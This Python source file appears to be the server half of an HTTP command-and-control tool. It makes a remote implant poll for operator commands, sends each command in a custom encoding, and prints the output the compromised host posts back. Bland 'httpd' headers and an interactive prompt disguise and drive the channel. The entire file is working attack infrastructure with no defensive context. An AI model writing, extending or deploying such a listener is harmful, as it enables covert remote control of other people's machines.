from http.server import HTTPServer, BaseHTTPRequestHandler
from time import sleep
from socketserver import  ThreadingMixIn
import threading
from urllib.parse import urlparse, unquote_plus, parse_qs
import zlib

import main
from custom_encode import *



class Handler(BaseHTTPRequestHandler):

  def _set_headers(self):
    self.send_response(200)
    self.send_header('Content-Type', '-')
    self.send_header('Server', 'httpd')
    self.end_headers()

  def do_POST(self):
    self._set_headers()
    content_len = int(self.headers.get('content-length', 0))
    post_body = self.rfile.read(content_len)
    post_body = custom_decode(post_body)
    if len(post_body) > 1:
      print(post_body)

  def do_GET(self):
    self._set_headers()
    while main.cmd == '':
      sleep(0.25)
    self.wfile.write(custom_encode(main.cmd.encode()))
    main.cmd = ''
    return

  def log_message(self, format, *args):
    #print(args)
    if 'GET' in args[0] and args[2] == '-':
      print("\n>>> ",end='')
    return


class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
  pass


def run():
  httpd = ThreadingSimpleServer( (main.LIP,main.LPORT) , Handler )
  httpd.serve_forever()
